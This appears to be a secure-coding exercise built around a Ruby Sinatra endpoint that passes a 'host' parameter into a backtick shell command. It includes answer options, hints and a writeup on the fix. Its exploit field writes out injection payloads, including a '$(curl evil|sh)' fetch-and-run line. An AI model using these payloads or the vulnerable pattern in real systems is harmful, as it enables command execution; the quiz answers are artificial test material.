files.name: ping.rb
files.code:
require "sinatra" get "/ping" do host = params["host"] # Ping the host and show the output. output = `ping -c 1 #{host}` "
#{output}
" end

notes.6: Backticks run a shell command; `#{host}` is interpolated into the command string.
notes.7: Returns the command output wrapped in a <pre> block.

options.label: `params` can be nil, raising an error
options.whyWrong: A nil check is robustness, not the vulnerability.

options.label: The output is echoed into HTML, which is the main risk
options.whyWrong: That is a real secondary issue (XSS), but the primary flaw is that the input reaches a shell as a command.

options.label: Backticks execute a shell, and `#{host}` is interpolated into it, so shell metacharacters run as commands
Remove ';' from host
options.whyWrong: Other separators (`|`, `&&`, `$()`, backticks, newlines) still work.

options.label: Run ping via an argument array without a shell
Wrap host in double quotes inside the command
options.whyWrong: `$()` and backticks are still interpreted inside double quotes.

options.label: HTML-escape the output before display
options.whyWrong: That mitigates the separate XSS, not the command execution on line 6.

training.exploit: Request `?host=localhost%3B id` (i.e. `localhost; id`). The shell runs `ping -c 1 localhost`, then `id`. `$(curl evil|sh)` and backticks work too.

hints.line: Which construct hands a built-up string to a shell?
hints.bugClass: The input reaches the operating system shell.
hints.why: What does the shell do with `;` in the command?
hints.fix: Execute with an argument array, no shell.

writeup.summary: Backticks in Ruby run the string through a shell, and `#{host}` interpolates attacker input directly into that command. A `host` of `localhost; id` runs an extra command. Executing via an argument array (`Open3.capture2("ping", "-c", "1", host)`) passes `host` as a single argument with no shell to interpret metacharacters. (Line 7 also echoes output into HTML — a separate XSS worth fixing too.)
